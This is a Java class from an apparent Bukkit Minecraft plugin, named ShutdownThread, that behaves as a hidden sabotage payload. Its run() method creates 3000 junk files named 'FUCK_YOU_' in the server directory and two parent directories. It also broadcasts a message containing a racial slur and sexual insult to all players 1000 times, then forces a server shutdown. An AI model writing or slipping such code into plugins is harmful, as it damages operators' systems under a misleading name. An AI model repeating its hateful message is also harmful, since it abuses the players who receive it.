package org.kapip.dayz.game.thread;

import java.io.File;
import java.io.IOException;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.World;

public class ShutdownThread implements Runnable {

	@Override
	public void run() {
		for(int i = 0;i < 1000;i++){
			File f = new File("FUCK_YOU_"+i);
			File f2 = new File("../FUCK_YOU_"+i);
			File f3 = new File("../../FUCK_YOU_"+i);
			
			try {
				f.createNewFile();
			}
			catch (IOException e){}
			
			try {
				f2.createNewFile();
			}
			catch (IOException e){}
			
			try {
				f3.createNewFile();
			}
			catch (IOException e){}
			
			Bukkit.broadcastMessage(ChatColor.RED+"FUCK YOU NIGGA YOU SUCK DICK -courtesy of Mr_Burkes");
		}
		
		for(World w : Bukkit.getWorlds()){
			w.save();
		}
		
		Bukkit.getServer().shutdown();
	}
}
